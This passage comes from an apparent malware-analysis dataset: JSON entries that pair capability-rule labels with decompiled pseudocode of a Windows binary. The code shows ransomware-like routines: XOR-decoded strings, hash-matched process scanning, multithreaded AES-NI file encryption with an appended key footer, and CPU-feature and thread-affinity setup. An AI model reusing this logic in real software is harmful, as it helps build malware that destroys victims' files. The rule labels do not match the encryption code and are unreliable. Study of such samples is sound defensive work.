(*pcVar5)();\n                if (var_b8h_2 == NULL) {\n                    (*var_c8h_2)(var_44h_2);\n                    (*var_cch_2)(&fcn.0041c440::var_100h_2);\n                    return 0x65a;\n                }\n                var_38h_2 = 0;\n                fcn.004011ad();\n                var_8h = 0;\n                uVar11 = 0;\n                uVar13 = 0x104;\n                piVar14 = var_3ch_2;\ncode_r0x0041c753:\n                if (uVar11 < uVar13) {\n                    fcn.004011ad();\n                    uVar11 = var_b0h_2 - &stack0xfffffe1c;\n                    piVar14 = &stack0xfffffe1c;\n                    var_3ch_2 = &stack0xfffffe1c;\n                    var_38h_2 = uVar11;\n                }\n                iVar9 = (*var_b8h_2)(var_b4h_2, &fcn.0041c440::var_178h, piVar14, uVar11, 0x2f);\n                var_34h = iVar9;\n                if ((-1 < iVar9) && (*piVar14 != 0)) {\n                    uVar11 = 0;\n                    var_7ch = *0x424e30;\n                    uStack124 = *0x424e34;\n                    uStack120 = *0x424e38;\n                    uStack116 = *0x424e3c;\n                    var_6ch = 0x79667b72;\n                    var_68h = 0x7b7d6075;\n                    var_64h._0_2_ = 0x7a;\n                    do {\n                        var_7ch._0_1_ = *0x424e30;\n                        puVar1 = &fcn.0041c440::var_7ch + uVar11 + 1;\n                        *puVar1 = *puVar1 ^ var_7ch;\n                        uVar11 = uVar11 + 1;\n                    } while (uVar11 < 0x18);\n                    var_64h._0_2_ = var_64h & 0xff;\n                    var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x429324, &fcn.0041c440::var_7ch + 1);\n                    var_30h = 0x8000;\n                    if (var_10h != NULL) {\n                        var_170h = 0x2c99bb9e;\n                        var_16ch = 0x280283ec;\n                        var_168h = 0xb1dfe25e;\n                        var_164h = 0xf0952b3f;\n                        var_160h = 0xe3040ac3;\n                        var_15ch = 0xdff94c0e;\n                        var_158h = 0x230d4c0f;\n                        var_154h = 0xedffa2df;\n                        var_150h = 0x7679dad9;\n                        var_14ch = 0xdfd4e1b0;\n                        var_148h = 0x2c03bac0;\n                        var_144h = 0xb2e7021a;\n                        var_140h = 0xa2db72b9;\n                        var_13ch = 0x2bc94c0f;\n                        var_138h = 0x6c916b9f;\n                        var_134h = 0x5fc881ab;\n                        var_130h = 0x6318437e;\n                        var_12ch = 0x32fb431e;\n                        var_128h = 0xeef7fba3;\n                        var_124h = 0x3ce08834;\n                        var_120h = 0x4a00e40d;\n                        var_11ch = 0x86059875;\n                        var_118h = 0x728cb221;\n                        var_114h = 0x5e2d07a0;\n                        var_110h = 0x2903f2af;\n                        var_10ch = 0x33fb126d;\n                        var_108h = 0x6895e8e4;\n                        while (pcVar5 = var_10h,  piVar10 = (*_sym.imp.msvcrt.dll_malloc)(var_30h),  iVar9 = var_34h, \n                              var_c0h = piVar10,  piVar10 != NULL) {\n                            var_c4h = (*pcVar5)(5, piVar10, var_30h, &fcn.0041c440::var_30h);\n                            piVar12 = piVar10;\n                            if (-1 < var_c4h) {\n                                iVar9 = 0;\n                                do {\n                                    var_bch = piVar14 + 1;\n                                    var_40h = *piVar14;\n                                    piVar10 = piVar10 + iVar9;\n                                    do {\n                                        iVar9 = *var_bch;\n                                        var_bch = var_bch + 1;\n                                        if (iVar9 == piVar10[0x11]) {\n                                            piVar3 = piVar10[0xf];\n                                            iVar9 = 0;\n                                            if (piVar3 != NULL) {\n                                                iVar2 = *piVar3;\n                                                piVar4 = piVar3;\n                                                while (iVar2 != 0) {\n                                                    piVar4 = piVar4 + 1;\n                                                    iVar9 = iVar9 + 1;\n                                                    iVar2 = *piVar4;\n                                                }\n                                            }\n                                            (*_sym.imp.USER32.dll_CharLowerBuffW)(piVar3, iVar9);\n                                            uVar11 = 0;\ncode_r0x0041c984:\n                                            if (0x1a < uVar11) {\n                                                iVar9 = fcn.0041a160();\n                                                if (iVar9 != 0) {\n                                                    uVar11 = 0;\n                                                    stack0xffffff9a = str._nLII_A._0_4_;\n                                                    uStack98 = str._nLII_A._4_4_;\n                                                    uStack94 = str.UWJF_VV._0_4_;\n                                                    uStack90 = str.UWJF_VV._4_4_;\n                                                    var_52h = 0x7e057600;\n                                                    var_4eh = 0x1f414c55;\n                                                    var_4ah = 0x41490005;\n                                                    var_46h = 0x78;\n                                                    do {\n                                                        var_64h._2_1_ = str._nLII_A._0_4_;\n                                                        puVar1 = &fcn.0041c440::var_64h + uVar11 + 3;\n                                                        *puVar1 = *puVar1 ^ var_64h._2_1_;\n                                                        uVar11 = uVar11 + 1;\n                                                    } while (uVar11 < 0x1c);\n                                                    var_46h = var_46h & 0xff;\n                                                    fcn.0040a0b0(&fcn.0041c440::var_64h + 3, piVar10[0xf]);\n                                                    var_8h = var_8h + 1;\n                                                    iVar9 = var_34h;\n                                                    goto code_r0x0041ca96;\n                                                }\n                                                goto code_r0x0041ca84;\n                                            }\n                                            if (*piVar10[0xf] == 0) {\n                                                iVar9 = 0;\n                                            }\n                                            else {\n                                                iVar9 = fcn.00401130();\n                                                piVar14 = var_3ch_2;\n                                            }\n                                            if (iVar9 != (&fcn.0041c440::var_170h)[uVar11]) goto code_r0x0041c9c9;\n                                        }\n                                        var_40h = var_40h + -1;\n                                    } while (var_40h != 0);\n                                    iVar9 = *piVar10;\n                                    piVar12 = var_c0h;\n                                } while (iVar9 != 0);\n                            }\n                            iVar6 = var_c4h;\n                            (*_sym.imp.msvcrt.dll_free)(piVar12);\n                            if (iVar6 != -0x3ffffffc) goto code_r0x0041ca7f;\n                        }\n                    }\n                }\n                goto code_r0x0041ca96;\n            }\n        }\n        puStack480 = &fcn.0041c440::var_100h_2;\n        iStack484 = 0x41cae9;\n        (*var_cch_2)();\n    }\n    return iVar9;\ncode_r0x0041c9c9:\n    uVar11 = uVar11 + 1;\n    goto code_r0x0041c984;\ncode_r0x0041ca7f:\n    iVar9 = var_34h;\n    if (iVar6 == 1) {\ncode_r0x0041ca84:\n        var_8h = var_8h + 1;\n        iVar9 = var_34h;\n    }\ncode_r0x0041ca96:\n    uVar11 = var_38h_2;\n    uVar13 = var_174h;\n    if (iVar9 != -0x3ffffffc) {\n        if (0 < var_8h) {\n            iVar9 = 1;\n        }\n        (*var_c8h_2)(var_44h_2);\n        (*var_cch_2)(&fcn.0041c440::var_100h_2);\n        return iVar9;\n    }\n    goto code_r0x0041c753;\n}\n",
        "token_count": 4933
    },
    "0041cb10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041cf33)\n// WARNING: Removing unreachable block (ram,0x0041cdb4)\n\nvoid fcn.0041cb10(void)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uchar (*arg_18h) [16];\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    int32_t *piVar13;\n    uint32_t unaff_ESI;\n    uint32_t uVar14;\n    uchar *unaff_EDI;\n    code *pcVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    uint *puVar18;\n    int32_t in_FS_OFFSET;\n    bool bVar19;\n    uchar auVar20 [16];\n    int64_t iVar21;\n    uint32_t uStack920;\n    uint32_t uStack916;\n    uint32_t uStack900;\n    uint32_t uStack896;\n    uint32_t uStack892;\n    uint32_t uStack888;\n    uchar auStack884 [4];\n    uchar auStack880 [16];\n    uchar auStack848 [16];\n    uchar auStack832 [16];\n    uchar auStack816 [16];\n    uchar auStack800 [16];\n    uchar auStack784 [16];\n    uchar auStack768 [16];\n    uchar auStack752 [16];\n    uchar auStack736 [16];\n    uchar auStack720 [16];\n    uchar auStack704 [16];\n    uchar auStack688 [16];\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uchar auStack512 [216];\n    uchar auStack296 [292];\n    \n    pcVar15 = _sym.imp.KERNEL32.dll_CloseHandle;\ncode_r0x0041cb24:\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetQueuedCompletionStatus)\n                      (*0x428e64, &uStack900, auStack884, &uStack888, 0xffffffff);\n    uVar14 = uStack888;\n    uVar17 = uStack900;\n    uStack892 = uStack888;\n    if (iVar6 == 0) goto code_r0x0041cb4d;\n    goto code_r0x0041cb51;\ncode_r0x0041cb4d:\n    if (uStack888 == 0) goto code_r0x0041cb24;\ncode_r0x0041cb51:\n    iVar6 = *(uStack888 + 0x24);\n    if (iVar6 == 1) {\n        auVar20 = *(uStack888 + 0x40054);\n        uStack920 = uStack900 & 0xf;\n        auStack880 = auVar20;\n        if (*0x429340 == 0) {\n            fcn.00406370(auStack296);\n            fcn.00406390(auStack296, uVar14 + 0x40034, 0x80);\n            uVar7 = uStack920;\n            uVar17 = uStack900;\n            auVar20 = auStack880;\n        }\n        else {\n            uVar7 = fcn.00409550();\n        }\n        if ((uVar17 != 0x40000) && (uVar7 != 0)) {\n            uVar7 = 0x10 - uStack920;\n            uStack920 = uVar7;\n        }\n        arg_18h = uVar14 + 0x34;\n        if (*0x429340 != 0) {\n            if (uStack920 + uVar17 != 0) {\n                iVar6 = ((uStack920 + uVar17) - 1 >> 4) + 1;\n                do {\n                    auVar20 = aesenc(auVar20 ^ *arg_18h ^ auStack848, auStack832);\n                    auVar20 = aesenc(auVar20, auStack816);\n                    auVar20 = aesenc(auVar20, auStack800);\n                    auVar20 = aesenc(auVar20, auStack784);\n                    auVar20 = aesenc(auVar20, auStack768);\n                    auVar20 = aesenc(auVar20, auStack752);\n                    auVar20 = aesenc(auVar20, auStack736);\n                    auVar20 = aesenc(auVar20, auStack720);\n                    auVar20 = aesenc(auVar20, auStack704);\n                    auVar20 = aesenclast(auVar20, auStack688);\n                    *arg_18h = auVar20;\n                    iVar6 = iVar6 + -1;\n                    arg_18h = arg_18h[1];\n                    uVar17 = uStack900;\n                } while (iVar6 != 0);\n            }\ncode_r0x0041ccc8:\n            if (*(uVar14 + 0x30) == 0) {\n                *(uVar14 + 8) = 0;\n                *(uVar14 + 0xc) = 0;\n                *(uVar14 + 0x24) = 2;\n            }\n            else {\n                uStack896 = *(uVar14 + 0x1c);\n                uStack892 = *(uVar14 + 0x18);\n                puVar10 = uStack920 + uVar14 + 0x24 + uVar17;\n                uVar2 = *puVar10;\n                uVar3 = puVar10[1];\n                uVar4 = puVar10[2];\n                uVar5 = puVar10[3];\n                *(uVar14 + 8) = *(uVar14 + 0x28);\n                *(uVar14 + 0xc) = *(uVar14 + 0x2c);\n                *(uVar14 + 0x24) = 5;\n                *(uVar14 + 0x40054) = uVar2;\n                *(uVar14 + 0x40058) = uVar3;\n                *(uVar14 + 0x4005c) = uVar4;\n                *(uVar14 + 0x40060) = uVar5;\n                if ((uStack896 < 1) && ((uStack896 < 0 || (uStack892 < 0x600000)))) {\n                    iVar6 = *(uVar14 + 0x2c) + (0xfffbffff < *(uVar14 + 0x28));\n                    if (uStack896 <= iVar6) {\n                        if (uStack896 < iVar6) goto code_r0x0041cf52;\n                        if (uStack892 <= *(uVar14 + 0x28) + 0x40000) {\n                            *(uVar14 + 0x24) = 2;\n                        }\n                    }\n                }\n                else {\n                    if (((uStack896 - 1) + (0x600000 < uStack892) == 0) && (uStack892 - 0x600001 < 0x2bfffff)) {\n                        uVar7 = uStack896 - (uStack892 < 0x180000);\n                        iVar21 = fcn.004011e0(uStack892 - 0x180000, uVar7, 4, 0);\n                        unaff_ESI = iVar21;\n                        iVar6 = iVar21 + 0x40000 >> 0x20;\n                        uVar17 = *(uVar14 + 0x28);\n                        iVar21 = fcn.004011e0(uVar17, *(uVar14 + 0x2c), iVar21 + 0x40000);\n                        if (iVar21 < 3) {\n                            iVar16 = uVar17 + uVar7;\n                            iVar6 = *(uVar14 + 0x2c) + iVar6 + CARRY4(uVar17, uVar7);\ncode_r0x0041ce43:\n                            *(uVar14 + 0x2c) = iVar6;\n                            *(uVar14 + 0x28) = iVar16;\n                            goto code_r0x0041ce49;\n                        }\n                    }\n                    else if (((uStack896 - 1) + (0x3200000 < uStack892) == 0) && (uStack892 + 0xfcdfffff < 0x31fffff)) {\n                        iVar6 = uStack892 - 0x200000;\n                        uVar7 = 6;\n                        iVar21 = fcn.004011e0(iVar6, uStack896 - (uStack892 < 0x200000), 6, 0);\n                        unaff_EDI = iVar21 >> 0x20;\n                        uStack920 = iVar21;\n                        uVar17 = *(uVar14 + 0x28);\n                        iVar21 = fcn.004011e0(uVar17, *(uVar14 + 0x2c), iVar21 + 0x40000);\n                        if (iVar21 < 0x100000000) {\n                            if (-1 < iVar21) {\n                                bVar19 = iVar21 < 5;\ncode_r0x0041ce32:\n                                if (!bVar19) goto code_r0x0041cf3c;\n                            }\ncode_r0x0041ce38:\n                            iVar16 = uVar17 + uVar7;\n                            iVar6 = *(uVar14 + 0x2c) + iVar6 + CARRY4(uVar17, uVar7);\n                            goto code_r0x0041ce43;\n                        }\n                    }\n                    else if (((uStack896 - 1) + (0x6400000 < uStack892) == 0) && (uStack892 + 0xf9bfffff < 0x18ffffff))\n                    {\n                        iVar6 = uStack892 - 0x380000;\n                        uVar7 = 0xc;\n                        iVar21 = fcn.004011e0(iVar6, uStack896 - (uStack892 < 0x380000), 0xc, 0);\n                        unaff_EDI = iVar21 >> 0x20;\n                        uStack920 = iVar21;\n                        uVar17 = *(uVar14 + 0x28);\n                        iVar21 = fcn.004011e0(uVar17, *(uVar14 + 0x2c), iVar21 + 0x40000);\n                        if (iVar21 < 0x100000000) {\n                            if (-1 < iVar21) {\n                                bVar19 = iVar21 < 0xb;\n                                goto code_r0x0041ce32;\n                            }\n                            goto code_r0x0041ce38;\n                        }\n                    }\n                    else {\n                        if ((uStack896 < 0) || ((uStack896 < 1 && (uStack892 < 0x1f400001)))) goto code_r0x0041ce49;\n                        iVar6 = uStack892 - 0xc80000;\n                        uVar7 = 0x30;\n                        iVar21 = fcn.004011e0(iVar6, uStack896 - (uStack892 < 0xc80000), 0x30, 0);\n                        unaff_EDI = iVar21 >> 0x20;\n                        uStack920 = iVar21;\n                        uVar17 = *(uVar14 + 0x28);\n                        iVar21 = fcn.004011e0(uVar17, *(uVar14 + 0x2c), iVar21 + 0x40000);\n                        if (iVar21 < 0x2f) goto code_r0x0041ce38;\n                    }\ncode_r0x0041cf3c:\n                    *(uVar14 + 0x28) = unaff_ESI - 0x40000;\n                    *(uVar14 + 0x2c) = unaff_EDI - (unaff_ESI < 0x40000);\ncode_r0x0041cf52:\n                    *(uVar14 + 0x24) = 2;\n                }\ncode_r0x0041ce49:\n                puVar1 = uVar14 + 0x28;\n                uVar17 = *puVar1;\n                *puVar1 = *puVar1 + uStack900 + uStack920;\n                *(uVar14 + 0x2c) = *(uVar14 + 0x2c) + CARRY4(uVar17, uStack900 + uStack920);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                              (*(uVar14 + 0x20), uVar14 + 0x34, uStack900 + uStack920, 0, uVar14);\n            goto code_r0x0041d239;\n        }\n        iVar6 = fcn.00406250(auStack296, 1, uVar7 + uVar17, auStack880, arg_18h, arg_18h);\n        uVar17 = uStack900;\n        if (iVar6 == 0) goto code_r0x0041ccc8;\n    }\n    else {\n        if (iVar6 == 2) {\n            (*pcVar15)(*(uStack888 + 0x20));\n            LOCK();\n            *0x429330 = *0x429330 + -1;\n            fcn.0040cc00(uVar14 + 0x40034, 0, 0x30);\n            (*_sym.imp.msvcrt.dll_free)(uVar14);\n            goto code_r0x0041cb24;\n        }\n        if (iVar6 == 3) goto code_r0x0041d1b5;\n        if (iVar6 == 4) {\n            piVar11 = uStack888 + 0x34;\n            piVar13 = 0x427000;\n            uVar17 = 0xc;\ncode_r0x0041cfb0:\n            if (*piVar11 == *piVar13) goto code_r0x0041cfb6;\n            *(uStack888 + 8) = *(uStack888 + 0x18);\n            iVar6 = *(uStack888 + 0x1c);\n            iVar16 = *(uStack888 + 0x18);\n            *(uStack888 + 0xc) = iVar6;\n            iVar12 = iVar6;\n            iVar8 = fcn.004012d0(iVar16, iVar6, 0x10, 0);\n            if (((*(uVar14 + 0x30) == 0) && (-1 < iVar6)) && ((0 < iVar6 || (0x40000 < *(uVar14 + 0x18))))) {\n                iVar8 = 0;\n            }\n            iVar6 = 0x10 - iVar8;\n            if (iVar8 < 1) {\n                iVar6 = iVar8;\n            }\n            *(uVar14 + 0x40053) = *(uVar14 + 0x18) & 0xf;\n            if (((*(uVar14 + 0x30) == 0) && (-1 < *(uVar14 + 0x1c))) &&\n               ((0 < *(uVar14 + 0x1c) || (0x40000 < *(uVar14 + 0x18))))) {\n                *(uVar14 + 0x40053) = 0;\n            }\n            unaff_EDI = auStack880;\n            *(uVar14 + 0x40054) = *(uVar14 + 0x40044);\n            *(uVar14 + 0x40058) = *(uVar14 + 0x40048);\n            *(uVar14 + 0x4005c) = *(uVar14 + 0x4004c);\n            *(uVar14 + 0x40060) = *(uVar14 + 0x40050);\n            fcn.0040d210(unaff_EDI, 0x10);\n            if (*0x429338 == 0) {\n                fcn.00401a70(0x428f18);\n                fcn.00401710(0x429058);\n                *0x429338 = 1;\n                iVar8 = fcn.00401c70(0x428f18, fcn.004015e0, 0x429058, &uStack888, 0x10);\n            }\n            else {\n                iVar8 = fcn.00401b80(0x428f18, &uStack888, 0x10);\n            }\n            if (iVar8 == 0) {\n                uStack552 = *(uVar14 + 0x40034);\n                uStack548 = *(uVar14 + 0x40038);\n                uStack544 = *(uVar14 + 0x4003c);\n                uStack540 = *(uVar14 + 0x40040);\n                uStack516 = *(uVar14 + 0x30);\n                uStack536 = *(uVar14 + 0x40044);\n                uStack532 = *(uVar14 + 0x40048);\n                uStack528 = *(uVar14 + 0x4004c);\n                uStack524 = *(uVar14 + 0x40050);\n                uStack520 = 0x40000;\n                fcn.0040cbe0(auStack512, 0x429260, *0x429334);\n                fcn.0040cc00(uVar14 + 0x34, 0, 0x40000);\n                iVar8 = iVar6 + uVar14;\n                iVar9 = fcn.00405a20(0x428e68, fcn.00401a90, 0x428f18, 0, 0x28, &uStack552, iVar8 + 0x34);\n                if (iVar9 == 0) {\n                    iVar6 = 0x20;\n                    puVar10 = &uStack552;\n                    do {\n                        *puVar10 = 0;\n                        puVar10 = puVar10 + 1;\n                        iVar6 = iVar6 + -1;\n                    } while (iVar6 != 0);\n                    puVar10 = 0x428960;\n                    puVar18 = iVar8 + 0x134;\n                    for (iVar6 = 0x140; uVar4 = *0x42700c,  uVar3 = *0x427008,  uVar2 = *0x427004,  iVar6 != 0;\n                        iVar6 = iVar6 + -1) {\n                        *puVar18 = *puVar10;\n                        puVar10 = puVar10 + 1;\n                        puVar18 = puVar18 + 1;\n                    }\n                    *(iVar8 + 0x634) = *0x427000;\n                    *(iVar8 + 0x638) = uVar2;\n                    *(iVar8 + 0x63c) = uVar3;\n                    *(iVar8 + 0x640) = uVar4;\n                    iVar16 = 1;\n                    uVar14 = uStack916;\n                    iVar6 = iVar12;\n                }\n            }\n            if (iVar16 != 0) {\n                *(uVar14 + 0x24) = 6;\n                iVar6 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(uVar14 + 0x20), uVar14 + 0x34, iVar6 + 0x610, 0, uVar14);\n                goto code_r0x0041d239;\n            }\n            goto code_r0x0041d1a8;\n        }\n        if (iVar6 != 5) {\n            if (iVar6 == 6) {\n                *(uStack888 + 0x24) = 1;\n                *(uStack888 + 8) = 0;\n                *(uStack888 + 0xc) = 0;\n                uVar17 = 0x40000;\n                if ((*(uStack888 + 0x1c) < 1) && ((*(uStack888 + 0x1c) < 0 || (*(uStack888 + 0x18) < 0x40000)))) {\n                    uVar17 = *(uStack888 + 0x18);\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)(*(uStack888 + 0x20), uStack888 + 0x34, uVar17, 0, uStack888);\n                if ((iVar6 == 0) && (*(in_FS_OFFSET + 0x34) != 0x3e5)) {\n                    LOCK();\n                    *0x429330 = *0x429330 + -1;\n                    (*pcVar15)(*(uVar14 + 0x20));\n                    (*_sym.imp.msvcrt.dll_free)(uVar14);\n                }\n            }\n            goto code_r0x0041cb24;\n        }\n        uVar17 = *(uStack888 + 0x28);\n        iVar12 = 0x40000;\n        uStack896 = uVar17 + 0x40000;\n        *(uStack888 + 0x24) = 1;\n        iVar16 = *(uStack888 + 0x2c) + (0xfffbffff < uVar17);\n        iVar6 = *(uStack888 + 0x1c);\n        if ((*(uStack888 + 0x1c) == iVar16 || iVar6 < iVar16) &&\n           ((iVar6 < iVar16 || (*(uStack888 + 0x18) <= uStack896)))) {\n            iVar12 = *(uStack888 + 0x18) - uVar17;\n        }\n        *(uStack888 + 0xc) = *(uStack888 + 0x2c);\n        *(uStack888 + 8) = uVar17;\n        iVar6 = (*_sym.imp.KERNEL32.dll_ReadFile)(*(uStack888 + 0x20), uStack888 + 0x34, iVar12, 0, uStack888);\ncode_r0x0041d239:\n        pcVar15 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if ((iVar6 != 0) || (*(in_FS_OFFSET + 0x34) == 0x3e5)) goto code_r0x0041cb24;\n    }\ncode_r0x0041d1a8:\n    LOCK();\n    *0x429330 = *0x429330 + -1;\n    pcVar15 = _sym.imp.KERNEL32.dll_CloseHandle;\ncode_r0x0041d1b5:\n    (*pcVar15)(*(uVar14 + 0x20));\n    (*_sym.imp.msvcrt.dll_free)(uVar14);\n    goto code_r0x0041cb24;\ncode_r0x0041cfb6:\n    piVar11 = piVar11 + 1;\n    piVar13 = piVar13 + 1;\n    bVar19 = uVar17 < 4;\n    uVar17 = uVar17 - 4;\n    if (bVar19) goto code_r0x0041d1a8;\n    goto code_r0x0041cfb0;\n}\n",
        "token_count": 5122
    },
    "0041d2e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d36b)\n// WARNING: Removing unreachable block (ram,0x0041d2f1)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041d2e0(void)\n\n{\n    uint8_t *puVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    bool bVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint unaff_EDI;\n    int32_t in_FS_OFFSET;\n    uint arglist;\n    uint var_5bh;\n    uint uStack91;\n    uint uStack87;\n    uint uStack83;\n    uint var_4bh;\n    uint32_t var_47h;\n    uint var_43h;\n    uint uStack67;\n    uint uStack63;\n    uint uStack59;\n    uint var_33h;\n    uint32_t var_2fh;\n    uint var_2bh;\n    uint uStack43;\n    uint uStack39;\n    uint uStack35;\n    ushort var_1bh;\n    uchar var_19h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    piVar2 = cpuid_basic_info(0);\n    var_18h = *piVar2;\n    var_14h = piVar2[1];\n    var_ch = piVar2[2];\n    var_10h = piVar2[3];\n    if (0 < var_18h) {\n        bVar3 = true;\n        bVar4 = true;\n        if (((var_14h != 0x756e6547) || (var_ch != 0x49656e69)) || (var_10h != 0x6c65746e)) {\n            bVar3 = false;\n        }\n        if (((var_14h != 0x68747541) || (var_ch != 0x69746e65)) || (var_10h != 0x444d4163)) {\n            bVar4 = false;\n        }\n        if ((bVar3) || (bVar4)) {\n            piVar2 = cpuid_Version_info(1);\n            var_18h = *piVar2;\n            var_14h = piVar2[1];\n            var_ch = piVar2[2];\n            var_10h = piVar2[3];\n            if ((var_10h & 0x2000000) != 0) {\n                uVar9 = 0;\n                var_43h = *0x424dc0;\n                uStack67 = *0x424dc4;\n                uStack63 = *0x424dc8;\n                uStack59 = *0x424dcc;\n                var_33h = 0x36353a31;\n                var_2fh = 0x303138;\n                do {\n                    var_43h._0_1_ = *0x424dc0;\n                    puVar1 = &var_43h + uVar9 + 1;\n                    *puVar1 = *puVar1 ^ var_43h;\n                    uVar9 = uVar9 + 1;\n                } while (uVar9 < 0x16);\n                var_2fh = var_2fh & 0xffffff;\n                fcn.0040a0b0(&var_43h + 1, unaff_EDI);\n                *0x429340 = 1;\n            }\n        }\n    }\n    iVar6 = fcn.00408640();\n    if (iVar6 == 0) {\n        return 0;\n    }\n    iVar6 = *(in_FS_OFFSET + 0x30);\n    arglist = 0xffffffff;\n    var_8h = iVar6;\n    *0x428e64 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(0xffffffff, 0, 0, *(iVar6 + 100) * 2);\n    uVar9 = 0;\n    var_5bh = *0x4245e0;\n    uStack91 = *0x4245e4;\n    uStack87 = *0x4245e8;\n    uStack83 = *0x4245ec;\n    var_4bh = 0x14030602;\n    var_47h = 0x494949;\n    do {\n        var_5bh._0_1_ = *0x4245e0;\n        puVar1 = &var_5bh + uVar9 + 1;\n        *puVar1 = *puVar1 ^ var_5bh;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x16);\n    var_47h = var_47h & 0xffffff;\n    fcn.0040a0b0(&var_5bh + 1, arglist);\n    uVar9 = 0;\n    if (*(iVar6 + 100) != 0) {\n        do {\n            uVar7 = fcn.0040cc20();\n            uVar8 = fcn.0040cc20();\n            pcVar5 = _sym.imp.ntdll.dll_NtSetInformationThread;\n            var_4h = 1 << (uVar9 & 0x1f);\n            (*_sym.imp.ntdll.dll_NtSetInformationThread)(uVar7, 4, &var_4h, 4);\n            (*pcVar5)(uVar8, 4, &var_4h, 4);\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < *(var_8h + 100));\n    }\n    fcn.0040cc00(0x429260, 0, 0x80);\n    fcn.0040d370();\n    uVar9 = 0;\n    var_2bh = *0x424bd0;\n    uStack43 = *0x424bd4;\n    uStack39 = *0x424bd8;\n    uStack35 = *0x424bdc;\n    var_1bh = 0x1f5a;\n    do {\n        var_2bh._0_1_ = *0x424bd0;\n        puVar1 = &var_2bh + uVar9 + 1;\n        *puVar1 = *puVar1 ^ var_2bh;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x11);\n    var_19h = 0;\n    fcn.0040a0b0(&var_2bh + 1, arglist);\n    return 1;\n}\n",
        "token_count": 1508
    },
    "0041d4f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0041d4f0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint uVar5;\n    char cVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uchar *arg_8h;\n    int32_t iVar10;\n    uint *puVar11;\n    int32_t in_FS_OFFSET;\n    uint ARG_0;\n    uint pszPath;\n    uint var_25ch;\n    uint pSecurityDescriptor;\n    uint *var_240h;\n    uint *var_23ch;\n    uint *var_238h;\n    uint *var_234h;\n    uint *var_230h;\n    uint *var_22ch;\n    uint *var_228h;\n    uint *var_224h;\n    uint *var_220h;\n    uint *var_21ch;\n    uint *var_218h;\n    uint *var_214h;\n    uint *var_210h;\n    uint *var_20ch;\n    uint *var_208h;\n    uint *var_204h;\n    uint *var_200h;\n    uint *var_1fch;\n    uint *var_1f8h;\n    uint *var_1f4h;\n    uint *var_1f0h;\n    uint *var_1ech;\n    uint *var_1e8h;\n    uint *var_1e4h;\n    uint *var_1e0h;\n    uint *var_1dch;\n    uint *var_1d8h;\n    uint *var_1d4h;\n    uint var_1d0h;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint ARG_1;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint 